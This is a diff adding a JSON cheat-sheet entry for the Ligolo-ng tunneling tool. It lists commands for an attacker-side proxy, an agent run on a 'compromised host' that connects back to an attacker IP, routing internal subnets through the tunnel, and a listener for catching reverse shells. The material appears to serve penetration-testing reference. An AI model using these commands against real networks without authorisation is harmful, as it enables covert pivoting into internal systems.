@@ -1,0 +1,87 @@
+{
+  "tool": "ligolo-ng",
+  "name": "Ligolo-ng",
+  "description": "A modern tunneling tool that exposes internal networks through a lightweight TUN interface — pivot without proxychains, using normal routing.",
+  "tags": [
+    "pivoting",
+    "tunneling",
+    "VPN",
+    "TUN"
+  ],
+  "homepage": "https://github.com/nicocha30/ligolo-ng",
+  "docs": "https://github.com/nicocha30/ligolo-ng/wiki",
+  "install": {
+    "other": "Download proxy and agent binaries from https://github.com/nicocha30/ligolo-ng/releases"
+  },
+  "related": [
+    "chisel",
+    "proxychains",
+    "ssh"
+  ],
+  "total_commands": 9,
+  "commands": [
+    {
+      "id": 1,
+      "category": "Proxy (attacker)",
+      "command": "./proxy -selfcert",
+      "example": "./proxy -selfcert",
+      "explanation": "Starts the ligolo-ng proxy with a self-signed certificate and opens its console."
+    },
+    {
+      "id": 2,
+      "category": "Proxy (attacker)",
+      "command": "ifconfig / ip tuntap add user <you> mode tun ligolo",
+      "example": "sudo ip tuntap add user kali mode tun ligolo",
+      "explanation": "Creates the ligolo TUN interface the proxy routes through."
+    },
+    {
+      "id": 3,
+      "category": "Proxy (attacker)",
+      "command": "sudo ip link set ligolo up",
+      "example": "sudo ip link set ligolo up",
+      "explanation": "Brings the TUN interface up."
+    },
+    {
+      "id": 4,
+      "category": "Agent (compromised host)",
+      "command": "./agent -connect <attacker>:<port>",
+      "example": "./agent -connect 10.10.14.5:11601",
+      "explanation": "Run on the pivot host; connects back to the proxy and appears as a session."
+    },
+    {
+      "id": 5,
+      "category": "Agent (compromised host)",
+      "command": "./agent -connect <attacker>:<port> -ignore-cert",
+      "example": "./agent -connect 10.10.14.5:11601 -ignore-cert",
+      "explanation": "Accepts the self-signed certificate."
+    },
+    {
+      "id": 6,
+      "category": "Routing (in the proxy console)",
+      "command": "session",
+      "example": "session",
+      "explanation": "Lists connected agents; pick one to make it active."
+    },
+    {
+      "id": 7,
+      "category": "Routing (in the proxy console)",
+      "command": "sudo ip route add <subnet> dev ligolo",
+      "example": "sudo ip route add 172.16.0.0/24 dev ligolo",
+      "explanation": "Routes an internal subnet through the active session — then use tools normally, no proxychains needed."
+    },
+    {
+      "id": 8,
+      "category": "Routing (in the proxy console)",
+      "command": "start",
+      "example": "start",
+      "explanation": "Starts the tunnel for the selected session."
+    },
+    {
+      "id": 9,
+      "category": "Routing (in the proxy console)",
+      "command": "listener_add --addr 0.0.0.0:<p> --to 127.0.0.1:<p>",
+      "example": "listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444",
+      "explanation": "Opens a reverse port on the agent that forwards to you — handy for catching shells from the internal network."
+    }
+  ]
+}
